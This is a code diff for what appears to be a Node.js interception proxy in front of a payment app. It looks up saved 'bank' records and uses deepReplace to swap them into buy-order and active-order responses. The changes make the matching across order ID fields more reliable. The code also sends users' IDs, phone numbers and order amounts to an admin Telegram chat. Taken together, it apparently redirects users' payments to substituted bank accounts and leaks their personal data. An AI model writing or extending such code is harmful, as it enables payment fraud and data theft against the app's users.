@@ -112,6 +112,14 @@ async function saveOrderBank(orderId, bank) {
   if (redis) redis.hset('nine99payOrderBankMap', key, JSON.stringify(bankData)).catch(()=>{});
 }
 
+async function saveOrderBankMultipleKeys(ids, bank) {
+  if (!bank) return;
+  const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
+  for (const id of uniqueIds) {
+    await saveOrderBank(id, bank);
+  }
+}
+
 async function getOrderBank(orderId) {
   if (!orderId) return null;
   const key = String(orderId);
@@ -125,6 +133,15 @@ async function getOrderBank(orderId) {
         return parsed;
       }
     } catch(e) {}
+  }
+  return null;
+}
+
+async function getOrderBankMultiple(ids) {
+  for (const id of ids) {
+    if (!id) continue;
+    const bank = await getOrderBank(String(id));
+    if (bank) return bank;
   }
   return null;
 }
@@ -1238,16 +1255,20 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
       } else {
         items = [listData];
       }
-      const getItemOrderId = (item) => item.buyOrderNo || item.orderNo || item.orderId || item.buyOrderId || item.id || '';
-      const orderIds = items.map(getItemOrderId).filter(Boolean);
+      const getItemIds = (item) => [item.buyOrderNo, item.orderNo, item.orderId, item.buyOrderId, item.id].filter(Boolean);
       const bankMap = {};
-      await Promise.all(orderIds.map(async (oid) => {
-        const b = await getOrderBank(oid);
-        if (b) bankMap[oid] = b;
+      await Promise.all(items.map(async (item) => {
+        const ids = getItemIds(item);
+        const bank = await getOrderBankMultiple(ids);
+        if (bank) {
+          const primaryId = ids[0];
+          bankMap[primaryId] = bank;
+        }
       }));
       for (const item of items) {
-        const oid = getItemOrderId(item);
-        const savedBank = bankMap[oid];
+        const ids = getItemIds(item);
+        const primaryId = ids[0];
+        const savedBank = bankMap[primaryId];
         if (savedBank) {
           deepReplace(item, savedBank, {}, 0);
         }
@@ -1335,19 +1356,21 @@ app.all('/app/buy/order/details', async (req, res) => {
     const respData = getResponseData(jsonResp);
     const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
 
-    const queryOrderId = req.query?.buyOrderNo || req.query?.orderId || req.query?.orderNo || '';
-    const bodyOrderId = req.parsedBody?.buyOrderNo || req.parsedBody?.orderId || req.parsedBody?.orderNo || '';
-    const respOrderId = rd.buyOrderNo || rd.orderNo || rd.orderId || rd.buyOrderId || '';
-    const orderId = queryOrderId || bodyOrderId || respOrderId || '';
+    const allIds = [
+      req.query?.buyOrderNo, req.query?.orderId, req.query?.orderNo,
+      req.parsedBody?.buyOrderNo, req.parsedBody?.orderId, req.parsedBody?.orderNo,
+      rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id
+    ].filter(Boolean);
 
-    if (respData && orderId) {
-      const savedBank = await getOrderBank(orderId);
+    if (respData && allIds.length > 0) {
+      const savedBank = await getOrderBankMultiple(allIds);
       if (savedBank) {
         if (Array.isArray(respData)) {
           respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
         } else {
           deepReplace(respData, savedBank, {}, 0);
         }
+        saveOrderBankMultipleKeys(allIds, savedBank);
       }
     }
 
@@ -1355,7 +1378,8 @@ app.all('/app/buy/order/details', async (req, res) => {
 
     if (data.adminChatId && bot && detectedUserId && !isLogOff(data, detectedUserId)) {
       const phone = getPhone(data, detectedUserId);
-      bot.sendMessage(data.adminChatId, `💰 Buy Order Details\n👤 User: ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderId || 'N/A'}\nAmount: ₹${rd.amount || rd.orderAmount || rd.paymentAmount || 'N/A'}\nTime: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const dispOrder = allIds[0] || 'N/A';
+      bot.sendMessage(data.adminChatId, `💰 Buy Order Details\n👤 User: ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nOrder: ${dispOrder}\nAmount: ₹${rd.amount || rd.orderAmount || rd.paymentAmount || 'N/A'}\nTime: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
